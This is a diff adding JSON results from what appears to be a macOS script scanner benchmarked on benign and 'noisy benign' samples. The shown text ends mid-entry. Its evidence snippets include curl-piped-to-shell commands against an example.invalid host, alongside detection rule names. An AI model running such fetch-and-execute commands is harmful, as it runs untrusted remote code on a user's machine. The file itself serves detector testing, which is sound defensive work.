@@ -1,0 +1,4110 @@
+[
+  {
+    "detectedType" : "appleScript",
+    "findings" : [
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "tell application \"Finder\"",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "脚本可控制 Finder 进行文件操作，需要结合上下文评估风险。",
+        "id" : "script|applescript.finder_control|2|2|-8109112087838115132",
+        "ruleID" : "applescript.finder_control",
+        "scoreDeltaBase" : 8,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/applescript\/clean_applescript_open_finder_01.applescript",
+          "lineEnd" : 2,
+          "lineStart" : 2
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "控制 Finder 行为"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "applescript.finder_control",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|4585433412521570531",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/applescript\/clean_applescript_open_finder_01.applescript"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "D29969DA-5F02-4335-AC5C-C6989E2A159D",
+    "sampleID" : "clean_applescript_open_finder_01"
+  },
+  {
+    "detectedType" : "javaScript",
+    "findings" : [
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "const encoded = Buffer.from(source, 'utf8').toString('base64');",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "发现 base64 编码还原逻辑，可能用于隐藏关键执行片段。",
+        "id" : "script|javascript.base64_obfuscation|3|3|-5208182043407053119",
+        "ruleID" : "javascript.base64_obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/js\/clean_js_base64_demo_01.js",
+          "lineEnd" : 3,
+          "lineStart" : 3
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Buffer\/base64 混淆痕迹"
+      },
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "const decoded = Buffer.from(encoded, 'base64').toString('utf8');",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "发现 base64 编码还原逻辑，可能用于隐藏关键执行片段。",
+        "id" : "script|javascript.base64_obfuscation|4|4|1241735172028450874",
+        "ruleID" : "javascript.base64_obfuscation",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/js\/clean_js_base64_demo_01.js",
+          "lineEnd" : 4,
+          "lineStart" : 4
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Buffer\/base64 混淆痕迹"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "javascript.base64_obfuscation",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|6410188931978730738",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/js\/clean_js_base64_demo_01.js"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "C0B5A1EC-D612-4A24-A134-8DF196FE3C4A",
+    "sampleID" : "clean_js_base64_demo_01"
+  },
+  {
+    "detectedType" : "javaScript",
+    "findings" : [
+      {
+        "category" : "execution",
+        "confidence" : "high",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "const { execFile } = require('child_process');",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "检测到 child_process 模块使用，可直接执行 shell 或二进制命令。",
+        "id" : "script|javascript.child_process|2|2|6732442128931838845",
+        "ruleID" : "javascript.child_process",
+        "scoreDeltaBase" : 22,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/js\/clean_js_child_process_echo_01.js",
+          "lineEnd" : 2,
+          "lineStart" : 2
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Node child_process 执行链"
+      },
+      {
+        "category" : "execution",
+        "confidence" : "low",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "console.log('[clean] child_process output:', stdout.trim());",
+        "evidenceStrength" : "weak",
+        "executionSemantics" : "printedOnly",
+        "explanation" : "检测到 child_process 模块使用，可直接执行 shell 或二进制命令。",
+        "id" : "script|javascript.child_process|12|12|-8432506085987282285",
+        "ruleID" : "javascript.child_process",
+        "scoreDeltaBase" : 22,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/js\/clean_js_child_process_echo_01.js",
+          "lineEnd" : 12,
+          "lineStart" : 12
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Node child_process 执行链"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "javascript.child_process",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|2681559953509067569",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/js\/clean_js_child_process_echo_01.js"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "52018068-C4C7-4580-9AC3-EBC3E3174870",
+    "sampleID" : "clean_js_child_process_echo_01"
+  },
+  {
+    "detectedType" : "plist",
+    "findings" : [
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "plist",
+        "evidenceSnippet" : "www.apple.com",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [url].",
+        "id" : "script|intel.url.known_malicious_host|0|0|8711931375906926522",
+        "ruleID" : "intel.url.known_malicious_host",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/plist\/clean_plist_launchagent_template_01.plist"
+        },
+        "tags" : [
+          "script",
+          "plist"
+        ],
+        "title" : "Threat Intel url"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "plist",
+        "evidenceSnippet" : "www.apple.com",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [url].",
+        "id" : "script|config.rule.file.intel.url.known_malicious_host|0|0|8711931375906926522",
+        "ruleID" : "config.rule.file.intel.url.known_malicious_host",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/plist\/clean_plist_launchagent_template_01.plist"
+        },
+        "tags" : [
+          "script",
+          "plist"
+        ],
+        "title" : "Threat Intel url"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "plist",
+        "evidenceSnippet" : "url:www.apple.com",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|4972226387369528494",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/plist\/clean_plist_launchagent_template_01.plist"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "9A6323CB-7E1B-40D6-89F3-F4AA4DA33B69",
+    "sampleID" : "clean_plist_launchagent_template_01"
+  },
+  {
+    "detectedType" : "pythonScript",
+    "findings" : [
+      {
+        "category" : "execution",
+        "confidence" : "high",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "result = subprocess.run(cmd, check=True, capture_output=True, text=True)",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "检测到 subprocess.run\/call\/Popen，脚本可直接拉起外部二进制或 shell。",
+        "id" : "script|python.subprocess_exec|11|11|3233976657558601931",
+        "ruleID" : "python.subprocess_exec",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/python\/clean_python_subprocess_safe_01.py",
+          "lineEnd" : 11,
+          "lineStart" : 11
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "subprocess 外部进程执行"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "python.subprocess_exec",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|7584112958049398004",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/python\/clean_python_subprocess_safe_01.py"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "ADCE057C-4671-41FB-8828-E957682B70D2",
+    "sampleID" : "clean_python_subprocess_safe_01"
+  },
+  {
+    "detectedType" : "shellScript",
+    "findings" : [
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "www.apple.com",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [url].",
+        "id" : "script|intel.url.known_malicious_host|4|4|8711931375906926522",
+        "ruleID" : "intel.url.known_malicious_host",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/shell\/clean_shell_open_safe_site_01.sh",
+          "lineEnd" : 4,
+          "lineStart" : 4
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel url"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "www.apple.com",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [url].",
+        "id" : "script|config.rule.file.intel.url.known_malicious_host|0|0|8711931375906926522",
+        "ruleID" : "config.rule.file.intel.url.known_malicious_host",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/shell\/clean_shell_open_safe_site_01.sh"
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel url"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "intel.url.known_malicious_host",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|4971587623526871332",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/shell\/clean_shell_open_safe_site_01.sh"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "EB50F3C9-A532-4FA8-A790-F3BB17834BB0",
+    "sampleID" : "clean_shell_open_safe_site_01"
+  },
+  {
+    "detectedType" : "shellScript",
+    "findings" : [
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "www.apple.com",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [url].",
+        "id" : "script|intel.url.known_malicious_host|11|11|8711931375906926522",
+        "ruleID" : "intel.url.known_malicious_host",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/shell\/clean_shell_write_test_plist_01.sh",
+          "lineEnd" : 11,
+          "lineStart" : 11
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel url"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "www.apple.com",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [url].",
+        "id" : "script|config.rule.file.intel.url.known_malicious_host|0|0|8711931375906926522",
+        "ruleID" : "config.rule.file.intel.url.known_malicious_host",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/shell\/clean_shell_write_test_plist_01.sh"
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "Threat Intel url"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "intel.url.known_malicious_host",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|4971587623526871332",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/clean\/shell\/clean_shell_write_test_plist_01.sh"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "3C377F6B-2F46-4C0E-8E9B-E79018F61BE0",
+    "sampleID" : "clean_shell_write_test_plist_01"
+  },
+  {
+    "detectedType" : "appleScript",
+    "findings" : [
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "tell application \"Finder\"",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "脚本可控制 Finder 进行文件操作，需要结合上下文评估风险。",
+        "id" : "script|applescript.finder_control|3|3|-8109112087838115132",
+        "ruleID" : "applescript.finder_control",
+        "scoreDeltaBase" : 8,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/applescript\/noisy_applescript_finder_batch_rename_01.applescript",
+          "lineEnd" : 3,
+          "lineStart" : 3
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "控制 Finder 行为"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "applescript.finder_control",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|4585433412521570531",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/applescript\/noisy_applescript_finder_batch_rename_01.applescript"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "5FD90637-7182-42E2-9752-15550AD961E5",
+    "sampleID" : "noisy_applescript_finder_batch_rename_01"
+  },
+  {
+    "detectedType" : "appleScript",
+    "findings" : [
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "tell application \"Terminal\"",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "脚本可驱动 Terminal 执行命令，存在行为链隐藏风险。",
+        "id" : "script|applescript.terminal_control|1|1|-2214705915413854807",
+        "ruleID" : "applescript.terminal_control",
+        "scoreDeltaBase" : 12,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/applescript\/noisy_applescript_terminal_echo_pwd_01.applescript",
+          "lineEnd" : 1,
+          "lineStart" : 1
+        },
+        "tags" : [
+          "script",
+          "appleScript"
+        ],
+        "title" : "控制 Terminal 应用"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "appleScript",
+        "evidenceSnippet" : "applescript.terminal_control",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|6347219866450744821",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/applescript\/noisy_applescript_terminal_echo_pwd_01.applescript"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "0B1BF4B4-878E-4FB0-B1FF-E20C3908AFAB",
+    "sampleID" : "noisy_applescript_terminal_echo_pwd_01"
+  },
+  {
+    "detectedType" : "javaScript",
+    "findings" : [
+      {
+        "category" : "execution",
+        "confidence" : "high",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "const { execFile } = require('child_process');",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "检测到 child_process 模块使用，可直接执行 shell 或二进制命令。",
+        "id" : "script|javascript.child_process|2|2|6732442128931838845",
+        "ruleID" : "javascript.child_process",
+        "scoreDeltaBase" : 22,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/js\/noisy_js_child_process_ls_01.js",
+          "lineEnd" : 2,
+          "lineStart" : 2
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Node child_process 执行链"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "javascript.child_process",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|2681559953509067569",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/js\/noisy_js_child_process_ls_01.js"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "DB21885E-5426-43B7-9C7A-34BDE68DDBFD",
+    "sampleID" : "noisy_js_child_process_ls_01"
+  },
+  {
+    "detectedType" : "javaScript",
+    "findings" : [
+      {
+        "category" : "obfuscation",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "const result = eval(expression);",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "检测到 eval\/Function 构造动态代码执行，存在混淆载荷风险。",
+        "id" : "script|javascript.eval|3|3|-4366275140989758158",
+        "ruleID" : "javascript.eval",
+        "scoreDeltaBase" : 22,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/js\/noisy_js_eval_math_only_01.js",
+          "lineEnd" : 3,
+          "lineStart" : 3
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "JavaScript 动态执行(eval)"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "javascript.eval",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|8173221146731121199",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/js\/noisy_js_eval_math_only_01.js"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "B9CE5378-C34D-43C5-8324-6DBD2D1BACE4",
+    "sampleID" : "noisy_js_eval_math_only_01"
+  },
+  {
+    "detectedType" : "javaScript",
+    "findings" : [
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "curl https:\/\/example.invalid\/pkg",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|5|5|-8414484467125331753",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/js\/noisy_js_postinstall_sim_01.js",
+          "lineEnd" : 5,
+          "lineStart" : 5
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "curl https:\/\/example.invalid\/pkg | sh",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|5|5|5508643713115449073",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/js\/noisy_js_postinstall_sim_01.js",
+          "lineEnd" : 5,
+          "lineStart" : 5
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "curl https:\/\/example.invalid\/pkg",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "configOnly",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|-8414484467125331753",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/js\/noisy_js_postinstall_sim_01.js"
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "high",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "curl https:\/\/example.invalid\/pkg | sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|config.rule.file.intel.regexp.command_combo|0|0|5508643713115449073",
+        "ruleID" : "config.rule.file.intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/js\/noisy_js_postinstall_sim_01.js"
+        },
+        "tags" : [
+          "script",
+          "javaScript"
+        ],
+        "title" : "Threat Intel regexp"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "javaScript",
+        "evidenceSnippet" : "intel.regexp.command_combo",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|-1417803420268309474",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/js\/noisy_js_postinstall_sim_01.js"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "0E1C2B62-ADE4-48A3-8FCF-43F0B626DF06",
+    "sampleID" : "noisy_js_postinstall_sim_01"
+  },
+  {
+    "detectedType" : "pkg",
+    "findings" : [
+      {
+        "category" : "installer",
+        "confidence" : "medium",
+        "detectedType" : "pkg",
+        "evidenceSnippet" : "#!\/usr\/bin\/env bash\nset -euo pipefail\nPROJECT_ROOT=\"$(cd \"$(dirname \"$0\")\/..\/..\/..\/..\" && pwd)\"",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "commentOnly",
+        "explanation" : "Package pre\/post install scripts can execute with installer privileges.",
+        "id" : "pkg.script|8347464613066929256",
+        "ruleID" : "pkg.install.script",
+        "scoreDeltaBase" : 11,
+        "severity" : "medium",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/pkg\/noisy_pkg_fixture_02",
+          "keyPath" : "\/scripts\/postinstall.sh"
+        },
+        "tags" : [
+          "pkg",
+          "postinstall.sh"
+        ],
+        "title" : "Installer script discovered"
+      }
+    ],
+    "id" : "ABD81882-C470-44E7-B265-1BEE8C656A67",
+    "sampleID" : "noisy_pkg_fixture_02"
+  },
+  {
+    "detectedType" : "pythonScript",
+    "findings" : [
+      {
+        "category" : "execution",
+        "confidence" : "high",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "result = subprocess.run(step, check=True, capture_output=True, text=True)",
+        "evidenceStrength" : "strong",
+        "executionSemantics" : "actualExecutionLike",
+        "explanation" : "检测到 subprocess.run\/call\/Popen，脚本可直接拉起外部二进制或 shell。",
+        "id" : "script|python.subprocess_exec|11|11|4907671601334028728",
+        "ruleID" : "python.subprocess_exec",
+        "scoreDeltaBase" : 20,
+        "severity" : "high",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/python\/noisy_python_build_subprocess_01.py",
+          "lineEnd" : 11,
+          "lineStart" : 11
+        },
+        "tags" : [
+          "script",
+          "pythonScript"
+        ],
+        "title" : "subprocess 外部进程执行"
+      },
+      {
+        "category" : "keyword",
+        "confidence" : "low",
+        "detectedType" : "pythonScript",
+        "evidenceSnippet" : "python.subprocess_exec",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Keyword-level static signal; requires context to determine impact.",
+        "id" : "keyword|7584112958049398004",
+        "ruleID" : "generic.keyword.hit",
+        "scoreDeltaBase" : 6,
+        "severity" : "low",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/python\/noisy_python_build_subprocess_01.py"
+        },
+        "tags" : [
+          "keyword"
+        ],
+        "title" : "Suspicious static keyword"
+      }
+    ],
+    "id" : "695498F2-8A15-4EB2-8585-1059E3774BE2",
+    "sampleID" : "noisy_python_build_subprocess_01"
+  },
+  {
+    "detectedType" : "shellScript",
+    "findings" : [
+      {
+        "category" : "network",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "DANGEROUS_LOOKING_CMD='curl -fsSL https:\/\/example.invalid\/installer.sh | bash'",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "检测到 curl 输出直接通过管道进入 sh\/bash\/zsh，属于典型远程代码直接执行链。",
+        "id" : "script|shell.curl_pipe_sh|8|8|-5654452468049521141",
+        "ruleID" : "shell.curl_pipe_sh",
+        "scoreDeltaBase" : 35,
+        "severity" : "critical",
+        "sourceLocation" : {
+          "filePath" : "\/Users\/wudazi\/Beforeinstall\/benchmark\/noisy_benign\/shell\/noisy_shell_installer_like_01.sh",
+          "lineEnd" : 8,
+          "lineStart" : 8
+        },
+        "tags" : [
+          "script",
+          "shellScript"
+        ],
+        "title" : "curl 下载后直接管道执行"
+      },
+      {
+        "category" : "generic",
+        "confidence" : "medium",
+        "detectedType" : "shellScript",
+        "evidenceSnippet" : "curl -fssl https:\/\/example.invalid\/installer.sh",
+        "evidenceStrength" : "moderate",
+        "executionSemantics" : "unknown",
+        "explanation" : "Matched unified threat profile section [regexp].",
+        "id" : "script|intel.regexp.command_combo|8|8|6479453370732703256",
+        "ruleID" : "intel.regexp.command_combo",
+        "scoreDeltaBase" : 14,
+        "severity" : "high",
+        "sourceLocation" : {
